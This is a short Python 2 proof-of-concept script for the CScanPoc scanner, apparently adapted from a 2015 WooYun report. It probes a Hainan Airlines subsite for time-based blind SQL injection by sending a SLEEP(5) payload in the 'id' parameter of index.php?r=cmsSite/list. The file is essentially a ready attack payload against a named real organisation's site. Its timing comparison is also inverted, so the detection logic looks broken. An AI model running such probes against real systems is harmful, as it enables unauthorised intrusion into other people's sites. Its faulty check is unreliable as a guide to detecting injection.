# coding: utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Hnaahk_0101' # 平台漏洞编号
    name = '海南航空旗下分站时间盲注' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-17'  # 漏洞公布时间
    desc = '''模版漏洞描述
    index.php?r=cmsSite/list&id=11
    参数id可以注入。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=138513
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hnaahk'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '9cf9eeca-001b-4844-abb2-0d3825863415' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload1 = "index.php?r=cmsSite/list&id=11"
            payload2 = "index.php?r=cmsSite/list&id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))PDUg)"
            url = self.target + payload1
            url2 = self.target + payload2
            start_time = time.time()
            _response = requests.get(url)
            end_time1 = time.time()
            _response = requests.get(url2)
            end_time2 = time.time()
            if (end_time1-start_time) - (end_time2-end_time1) > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
